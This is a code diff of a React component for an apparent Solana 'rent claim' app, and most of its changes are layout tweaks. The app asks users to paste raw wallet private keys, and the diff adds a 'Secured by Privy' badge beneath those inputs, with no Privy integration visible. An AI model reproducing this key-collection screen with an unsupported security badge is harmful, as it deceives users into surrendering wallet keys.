@@ -22,6 +22,7 @@ import {
   ArrowUpRight,
   ChevronDown,
   Key,
+  Lock,
   Plus,
   Trash2,
   ShieldAlert,
@@ -793,24 +794,24 @@ export default function SolClaimApp() {
               )}
             </div>
           </div>
-          <div className="flex items-center gap-3">
+          <div className="flex items-center gap-2 shrink-0">
             {user && (
-              <div className="flex items-center gap-2 min-w-0">
+              <div className="flex items-center gap-1.5 min-w-0">
                 {user.photo_url ? (
                   <img
                     src={user.photo_url}
                     alt=""
-                    className="w-8 h-8 rounded-full object-cover ring-2 ring-primary/20 flex-shrink-0"
+                    className="w-7 h-7 rounded-full object-cover ring-2 ring-primary/20 flex-shrink-0"
                   />
                 ) : (
-                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0">
-                    <span className="text-xs font-black text-primary">
+                  <div className="w-7 h-7 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0">
+                    <span className="text-[10px] font-black text-primary">
                       {(user.first_name?.[0] || '?').toUpperCase()}
                     </span>
                   </div>
                 )}
-                <span className="text-xs font-bold text-foreground truncate max-w-[100px]">
-                  {[user.first_name, user.last_name].filter(Boolean).join(' ')}
+                <span className="text-[11px] font-bold text-foreground truncate max-w-[72px] sm:max-w-[90px]">
+                  {user.first_name}{user.last_name ? ` ${user.last_name}` : ''}
                 </span>
               </div>
             )}
@@ -1407,6 +1408,12 @@ export default function SolClaimApp() {
             <div className="space-y-3">
               <Label className="text-[11px] font-black text-muted-foreground uppercase tracking-widest">Private Key (Base58)</Label>
               <Input type="password" placeholder="Paste your private key..." value={addWalletKey} onChange={(e) => { setAddWalletKey(e.target.value); setAddWalletModalAccounts([]); setAddWalletModalRent(0); setAddWalletDerivedAddress(''); }} className="h-12 bg-background border-2 border-border rounded-xl font-mono text-base ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none min-w-0" />
+              <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
+                <Lock className="w-3 h-3 shrink-0" />
+                <span>Secured by</span>
+                <img src="https://privy.io/favicon.ico" alt="Privy" className="w-3.5 h-3.5" />
+                <span className="font-semibold text-foreground">Privy</span>
+              </div>
             </div>
             {addWalletDerivedAddress && (
               <p className="text-[10px] text-muted-foreground font-mono">{addWalletDerivedAddress.slice(0, 8)}...{addWalletDerivedAddress.slice(-8)}</p>
@@ -1463,58 +1470,60 @@ export default function SolClaimApp() {
               {/* Private Key Modal */}
       {isKeyModalOpen && (
         <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-200">
-          <div className="bg-card border-2 border-border p-8 rounded-3xl w-full max-w-sm space-y-6 shadow-2xl animate-in zoom-in-95 duration-200 relative overflow-hidden">
+          <div className="bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4 shadow-2xl animate-in zoom-in-95 duration-200 relative overflow-hidden" onClick={(e) => e.stopPropagation()}>
             <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary-foreground to-primary" />
-            
-            <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto shadow-inner">
-              <Key className="w-8 h-8 text-primary" />
+            <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
+              <Key className="w-6 h-6 text-primary" />
             </div>
-            
-              <div className="text-center space-y-3">
-              <h3 className="text-2xl font-black text-foreground tracking-tight">{addKeyWalletId ? 'Add Private Key' : 'Secure Your Wallet'}</h3>
-              <p className="text-sm text-muted-foreground leading-relaxed font-medium">
-                {addKeyWalletId
-                  ? <>Add the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{addKeyWalletAddress.slice(0, 4)}...{addKeyWalletAddress.slice(-4)}</span> to enable batch claiming.</>
-                  : <>To claim rent automatically, we need the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{publicKey.slice(0, 4)}...{publicKey.slice(-4)}</span>.</>
-                }
-              </p>
-            </div>
+            <h3 className="text-xl font-black text-foreground tracking-tight">{addKeyWalletId ? 'Add Private Key' : 'Secure Your Wallet'}</h3>
+            <p className="text-xs text-muted-foreground">
+              {addKeyWalletId
+                ? <>Add the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{addKeyWalletAddress.slice(0, 4)}...{addKeyWalletAddress.slice(-4)}</span> to enable batch claiming.</>
+                : <>To claim rent automatically, we need the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{publicKey.slice(0, 4)}...{publicKey.slice(-4)}</span>.</>
+              }
+            </p>
 
             <div className="space-y-3">
-              <Label htmlFor="privateKey" className="text-xs font-bold text-muted-foreground uppercase tracking-widest ml-1">Private Key (Base58)</Label>
+              <Label htmlFor="privateKey" className="text-[11px] font-black text-muted-foreground uppercase tracking-widest ml-1">Private Key (Base58)</Label>
               <Input
                 id="privateKey"
                 type="password"
                 placeholder="Paste your private key..."
                 value={privateKeyInput}
                 onChange={(e) => setPrivateKeyInput(e.target.value)}
-                className="h-14 bg-background border-2 border-border rounded-2xl font-mono text-base ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none min-w-0"
+                className="h-12 bg-background border-2 border-border rounded-xl font-mono text-base ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none min-w-0"
               />
+              <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
+                <Lock className="w-3 h-3 shrink-0" />
+                <span>Secured by</span>
+                <img src="https://privy.io/favicon.ico" alt="Privy" className="w-3.5 h-3.5" />
+                <span className="font-semibold text-foreground">Privy</span>
+              </div>
             </div>
 
             {(telegramError || error) && (
-              <div className="p-4 rounded-2xl bg-destructive/10 border border-destructive/20 flex items-start gap-3">
-                <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
-                <p className="text-sm font-bold text-destructive">{telegramError || error}</p>
+              <div className="p-3 rounded-xl bg-destructive/10 border border-destructive/20 flex items-start gap-3">
+                <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
+                <p className="text-sm font-medium text-destructive">{telegramError || error}</p>
               </div>
             )}
 
-            <div className="flex gap-3 pt-2">
+            <div className="flex gap-3">
               <Button 
                 variant="outline" 
-                className="w-full h-14 rounded-2xl font-bold border-2"
+                className="w-full h-12 rounded-xl font-bold border-2"
                 onClick={addKeyWalletId ? closeKeyModal : () => { setIsKeyModalOpen(false); setPrivateKeyInput(''); setError(''); setAddKeyWalletId(null); setAddKeyWalletAddress(''); }}
               >
                 CANCEL
               </Button>
               <Button 
-                className="w-full h-14 rounded-2xl bg-primary text-primary-foreground font-black shadow-xl shadow-primary/25 active:scale-[0.98] transition-all border border-primary-foreground/10"
+                className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-black shadow-md shadow-primary/20 active:scale-[0.98] transition-all border border-primary-foreground/10"
                 onClick={addKeyWalletId ? handleAddKeyOnly : handleSavePrivateKey}
                 disabled={!privateKeyInput || isSubmittingKey}
               >
                 {isSubmittingKey ? (
-                  <div className="flex items-center gap-3">
-                    <div className="animate-spin rounded-full h-5 w-5 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
+                  <div className="flex items-center gap-2">
+                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
                     SAVING...
                   </div>
                 ) : addKeyWalletId ? (
